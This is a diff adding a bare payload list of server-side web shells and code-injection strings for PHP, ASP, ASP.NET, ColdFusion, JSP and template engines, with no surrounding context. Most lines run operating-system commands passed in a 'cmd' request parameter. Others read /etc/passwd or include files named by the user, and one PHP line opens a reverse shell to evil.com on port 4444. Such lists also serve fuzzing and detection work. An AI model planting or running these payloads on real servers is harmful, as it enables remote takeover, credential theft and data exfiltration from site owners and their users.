@@ -1,0 +1,48 @@
+<?php system($_GET['cmd']); ?>
+<?php phpinfo(); ?>
+<?php eval($_POST['cmd']); ?>
+<?php exec('id'); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php system("id"); ?>
+<?php echo file_get_contents('/etc/passwd'); ?>
+<?php include '/etc/passwd'; ?>
+<?php include $_GET['file']; ?>
+<?php require($_GET['cmd']); ?>
+<?php $cmd = $_GET['cmd']; system($cmd); ?>
+<?php $output = shell_exec('id'); echo $output; ?>
+<?php echo `id`; ?>
+<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
+<?php $sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
+<% eval Request("cmd") %>
+<% response.write(server.createobject("wscript.shell").exec("cmd.exe /c " & request("cmd")).stdout.readall) %>
+<%= shell("id") %>
+<%sys="cmd /c "&request("cmd")%><%set o=server.createobject("Wscript.shell")%><%o.run sys %>
+<pre><%response.write(server.createobject("wscript.shell").exec("cmd /c " & request("cmd")).stdout.readall)%></pre>
+<cfexecute name="id" outputfile="C:\test.txt"></cfexecute>
+<cfhttp url="http://evil.com/steal">
+<cfscript>WriteOutput(createObject("java","java.lang.Runtime").getRuntime().exec("id"));</cfscript>
+<%@ Page Language="C#" %>
+<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
+<script language="VB" runat="server">Sub Page_Load(ByVal Src As Object, ByVal E As EventArgs):Dim p As New System.Diagnostics.Process():p.StartInfo.FileName="cmd.exe":p.StartInfo.Arguments="/c " & Request("cmd"):p.Start():End Sub</script>
+<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet>
+<jsp:scriptlet>ProcessBuilder pb = new ProcessBuilder(request.getParameter("cmd"));pb.start();</jsp:scriptlet>
+<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+<%= request.getRealPath("/") %>
+<%= application.getRealPath("/") %>
+<%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next() %>
+<%="".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")%>
+<%Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});%>
+<%@ Page Language="Java" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+#{request.getParameter("cmd")}
+#{session.getAttribute("user")}
+#{facesContext.getExternalContext().getRequestParameterMap().get("cmd")}
+<cfexecute name="cmd.exe" arguments="/c dir" outputfile="C:\output.txt" timeout="10">
+<cffile action="upload" destination="C:\webroot\" filefield="upload">
+<cfset result = createObject("java","java.lang.Runtime").getRuntime().exec("id")>
+<? system("id"); ?>
+{python:os.system('id')}
+{php:system('id')}
+{jsp:Runtime.getRuntime().exec('id')}
+{{system('id')}}
+<%= `id` %>
